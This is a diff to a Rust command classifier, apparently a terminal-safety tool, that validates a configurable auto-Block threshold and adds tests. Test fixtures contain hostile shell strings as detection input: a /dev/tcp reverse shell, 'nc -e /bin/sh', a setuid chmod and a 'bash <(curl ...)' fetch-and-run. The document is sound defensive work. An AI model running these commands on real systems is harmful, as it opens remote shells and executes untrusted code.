@@ -96,8 +96,27 @@ impl Classifier {
     /// `[accumulator] block_threshold = 0.95` in the daemon's
     /// TOML config to enable auto-Block escalation. `None` keeps
     /// the default "always Warn" behaviour.
+    ///
+    /// Values outside `[WARN_THRESHOLD, 1.0]` (or NaN) are
+    /// silently rejected (treated as `None`) with a stderr warning
+    /// — anything below WARN_THRESHOLD would escalate verdicts
+    /// that the accumulator itself already drops to Safe, and
+    /// anything > 1.0 can never trigger since combined confidence
+    /// saturates at 1.0. The clamp keeps a typo'd config from
+    /// silently disabling or over-triggering the auto-Block path.
     pub fn with_block_threshold(mut self, t: Option<f32>) -> Self {
-        self.block_threshold = t;
+        self.block_threshold = match t {
+            Some(v) if v.is_finite() && (WARN_THRESHOLD..=1.0).contains(&v) => Some(v),
+            Some(v) => {
+                eprintln!(
+                    "atty-guard: ignoring [accumulator] block_threshold = {} \
+                     — must be a finite number in [{}, 1.0]; keeping default (no auto-Block)",
+                    v, WARN_THRESHOLD
+                );
+                None
+            }
+            None => None,
+        };
         self
     }
 
@@ -168,13 +187,16 @@ impl Classifier {
 /// we skip the SLM (we've already accumulated strong-enough
 /// signal that the ~50 ms SLM cost buys nothing).
 ///
-/// Note: no auto-`Block` threshold in Phase 1. Block is "hard
-/// refuse, no prompt" per `protocol::Verdict::Block`; escalating
-/// curl|sh / flagged_url / npm hits from prompt-the-user to
-/// auto-refuse is a user-visible policy change deferred to a
-/// future PR with a config knob. Today's accumulator boosts the
-/// confidence NUMBER (visible in the banner + trust-cache keys)
-/// while keeping the verdict at Warn.
+/// Auto-`Block` escalation is opt-in via `[accumulator]
+/// block_threshold` (Phase 2). When unset, every accumulator
+/// verdict stays `Warn` — the confidence NUMBER (visible in the
+/// banner + trust-cache keys) still rises with multi-hit, but
+/// the verdict surfaces from the primary hit. With the knob set,
+/// `combine_hits` escalates Warn → Block only when (a) combined
+/// confidence ≥ threshold AND (b) ≥ 2 distinct signals fired.
+/// Single-hit cases (curl|sh's canonical 1.0) always stay Warn
+/// so the user retains the [y]/[t]/cancel choice on legitimate
+/// install scripts.
 const WARN_THRESHOLD: f32 = 0.5;
 const SLM_CONFIRM_THRESHOLD: f32 = 0.9;
 
@@ -946,10 +968,11 @@ mod tests {
 
     #[test]
     fn three_plus_atoms_saturate_toward_one() {
-        // Three atoms: 1 - 0.4^3 = 0.936. Verdict stays Warn
-        // (no auto-Block escalation in V2-J Phase 1) but the
-        // confidence number is now well above the SLM-confirm
-        // threshold, signalling "strong evidence" to the banner.
+        // Three atoms: 1 - 0.4^3 = 0.936. Without `block_threshold`
+        // set the verdict stays Warn (default Phase 2 behaviour is
+        // backwards-compatible with Phase 1); the confidence number
+        // is well above the SLM-confirm threshold, signalling
+        // "strong evidence" to the banner.
         let c = Classifier::new();
         let r = c.classify(
             "bash -i >& /dev/tcp/10.0.0.1/4444; nc -e /bin/sh; chmod +s /tmp/x",
@@ -1035,6 +1058,47 @@ mod tests {
             "expected <0.95 (below threshold), got {}",
             r.confidence
         );
+    }
+
+    #[test]
+    fn block_threshold_slm_plus_atom_escalates_to_block() {
+        // V2-J Phase 2: the SLM's hit counts toward the ≥ 2 distinct
+        // signals guard. HeuristicBackend's proc-substitution rule
+        // (0.85) combined with the `bash <(curl` atom (0.6) →
+        // combined 0.94, two distinct signals. With block_threshold
+        // = 0.9, escalate Warn → Block.
+        let c = Classifier::new_with_backend(
+            BackendKind::Heuristic,
+            &crate::config::OnnxConfig::default(),
+        )
+        .with_block_threshold(Some(0.9));
+        let r = c.classify("bash <(curl -fsSL https://x.com/installer.sh)");
+        assert!(
+            matches!(r.verdict, Verdict::Block),
+            "expected Block from SLM+atom combo, got {:?}",
+            r.verdict
+        );
+        assert!(r.reason.contains("signals fired"));
+    }
+
+    #[test]
+    fn block_threshold_out_of_range_is_rejected() {
+        // Values outside [WARN_THRESHOLD, 1.0] silently degrade to
+        // None — protects against a typo'd `block_threshold = 0.0`
+        // auto-blocking everything multi-hit, or NaN silently
+        // disabling the path.
+        for v in [0.0_f32, 0.3, 1.5, f32::NAN, f32::INFINITY, -1.0] {
+            let c = Classifier::new().with_block_threshold(Some(v));
+            let r = c.classify(
+                "bash -i >& /dev/tcp/10.0.0.1/4444; nc -e /bin/sh; chmod +s /tmp/x",
+            );
+            assert!(
+                matches!(r.verdict, Verdict::Warn),
+                "block_threshold = {} should be ignored → Warn, got {:?}",
+                v,
+                r.verdict
+            );
+        }
     }
 
     #[test]
